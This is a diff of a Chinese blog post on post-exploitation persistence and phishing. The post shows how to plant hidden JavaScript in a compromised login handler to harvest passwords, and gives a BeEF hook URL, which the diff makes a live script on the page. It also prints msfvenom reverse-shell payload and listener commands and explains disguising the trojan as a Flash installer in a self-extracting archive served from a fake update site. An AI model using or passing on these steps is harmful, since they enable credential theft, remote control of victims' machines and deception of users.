@@ -16,27 +16,27 @@
   <meta name="author" content="Yf3te">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1、权限维持，获取登录记录 前提：拿到了web权限，例如：www-data：shell权限 然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php  在get.php文件中包含文件写入代码  每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码 还可以直接远程连接b">
+    <meta name="description" content="1、权限维持，获取登录记录 前提：拿到了web权限，例如：www-data：shell权限 然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php   在get.php文件中包含文件写入代码   每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码 还可以直接远程连">
 <meta property="og:type" content="article">
-<meta property="og:title" content="模拟实战权限维持+钓鱼">
+<meta property="og:title" content="Yf3te">
 <meta property="og:url" content="http://example.com/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/index.html">
 <meta property="og:site_name" content="Yf3te">
-<meta property="og:description" content="1、权限维持，获取登录记录 前提：拿到了web权限，例如：www-data：shell权限 然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php  在get.php文件中包含文件写入代码  每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码 还可以直接远程连接b">
+<meta property="og:description" content="1、权限维持，获取登录记录 前提：拿到了web权限，例如：www-data：shell权限 然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php   在get.php文件中包含文件写入代码   每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码 还可以直接远程连">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/e2b6518a-fffe-49de-b404-d8f7eb8e1b09/Untitled.png">
-<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/70c06226-7ab9-498c-a607-cbffce4296b6/Untitled.png">
-<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/14a2b91a-995d-462c-8883-29a8082b6e5b/Untitled.png">
-<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/688b3531-f48f-4c03-b3ba-a84bdd7123a6/Untitled.png">
-<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/c1c4f9af-4140-4e71-a168-870955e1788c/Untitled.png">
-<meta property="article:published_time" content="2024-05-25T05:35:02.000Z">
-<meta property="article:modified_time" content="2024-05-25T05:45:09.858Z">
+<meta property="og:image" content="http://example.com/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled.png">
+<meta property="og:image" content="http://example.com/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%201.png">
+<meta property="og:image" content="http://example.com/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%202.png">
+<meta property="og:image" content="http://example.com/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%203.png">
+<meta property="og:image" content="http://example.com/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%204-1723538069165-7.png">
+<meta property="article:published_time" content="2024-05-25T05:35:02.292Z">
+<meta property="article:modified_time" content="2024-08-13T08:34:33.867Z">
 <meta property="article:author" content="Yf3te">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/e2b6518a-fffe-49de-b404-d8f7eb8e1b09/Untitled.png">
+<meta name="twitter:image" content="http://example.com/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled.png">
   
   
   
-  <title>模拟实战权限维持+钓鱼 - Yf3te</title>
+  <title>Yf3te</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -231,7 +231,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="模拟实战权限维持+钓鱼"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -310,7 +310,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">模拟实战权限维持+钓鱼</h1>
+            <h1 id="seo-header"></h1>
             
             
               <div class="markdown-body">
@@ -318,22 +318,27 @@
                 <p>1、权限维持，获取登录记录</p>
 <p>前提：拿到了web权限，例如：www-data：shell权限</p>
 <p>然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php</p>
-<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/e2b6518a-fffe-49de-b404-d8f7eb8e1b09/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<img src="/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+
 <p>在get.php文件中包含文件写入代码</p>
-<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/70c06226-7ab9-498c-a607-cbffce4296b6/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<img src="/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%201.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+
 <p>每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码</p>
 <p>还可以直接远程连接beef，只需要修改js代码为</p>
-<!--<script src=http://192.168.43.43:3000/hook.js></script>-->
+<script src=http://192.168.43.43:3000/hook.js></script>
 
 <h2 id="2、钓鱼实战"><a href="#2、钓鱼实战" class="headerlink" title="2、钓鱼实战"></a>2、钓鱼实战</h2><h3 id="1、msf生成木马文件"><a href="#1、msf生成木马文件" class="headerlink" title="1、msf生成木马文件"></a>1、msf生成木马文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">msfvenom <span class="hljs-operator">-</span>p windows<span class="hljs-operator">/</span>meterpreter<span class="hljs-operator">/</span>reverse_tcp LHOST<span class="hljs-operator">=</span><span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.43</span><br>LPORT<span class="hljs-operator">=</span><span class="hljs-number">6666</span> <span class="hljs-operator">-</span>f exe <span class="hljs-operator">&gt;</span> flash.exe<br><span class="hljs-number">2</span>、下载官方文件<span class="hljs-operator">-</span>保证安装正常<br><span class="hljs-number">3</span>、压缩捆绑文件<span class="hljs-operator">-</span>解压提取运行<br><span class="hljs-number">4</span>、MSF 配置监听状态<br>use exploit<span class="hljs-operator">/</span>multi<span class="hljs-operator">/</span>handler<br><span class="hljs-keyword">set</span> payload windows<span class="hljs-operator">/</span>meterpreter<span class="hljs-operator">/</span>reverse_tcp<br><span class="hljs-keyword">set</span> lhost <span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.43</span><br><span class="hljs-keyword">set</span> lport <span class="hljs-number">6666</span><br>run<br></code></pre></td></tr></table></figure>
 
 <h3 id="2、木马文件封装思路"><a href="#2、木马文件封装思路" class="headerlink" title="2、木马文件封装思路"></a>2、木马文件封装思路</h3><p>为了掩人耳目，可以把木马文件和flash正经文件封装到压缩包里面，然后使用winrar工具进行自解压相关操作，找到选项解压前运行木马文件，这样当对方打开zip文件解压前，就会无声无息的运行我们的木马文件</p>
-<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/14a2b91a-995d-462c-8883-29a8082b6e5b/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/688b3531-f48f-4c03-b3ba-a84bdd7123a6/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<img src="/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%202.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+
+<img src="/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%203.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+
 <p>再把文件名改为flash_install.exe文件，同时为了更加逼真，我们还可以修改文件图标</p>
 <p>Restorator(图标修改工具)，修改过程就找到一个酷似flash官方的图标，然后工具替换就行了</p>
 <p>成品展示：</p>
-<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/c1c4f9af-4140-4e71-a168-870955e1788c/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<img src="/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/Untitled%204-1723538069165-7.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+
 <h3 id="3、网站设计思路"><a href="#3、网站设计思路" class="headerlink" title="3、网站设计思路"></a>3、网站设计思路</h3><p>我们直接发送木马，对方肯定不会傻到直接点入，此时就要学会做钓鱼网站，勾起他的兴趣，比如放一个视频，但是当对方访问时显示flash版本不够，此时就重定向到自己编辑的网站，当按下安装键，就会让对方下载，然后运行</p>
 <p>然后利用虚拟机(NAT)完成实战即可，不知道桥接模式能否成功，没试过</p>
 
@@ -353,7 +358,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>模拟实战权限维持+钓鱼</div>
+      <div></div>
       <div>http://example.com/2024/05/25/模拟实战权限维持-钓鱼/</div>
     </div>
     <div class="license-meta">
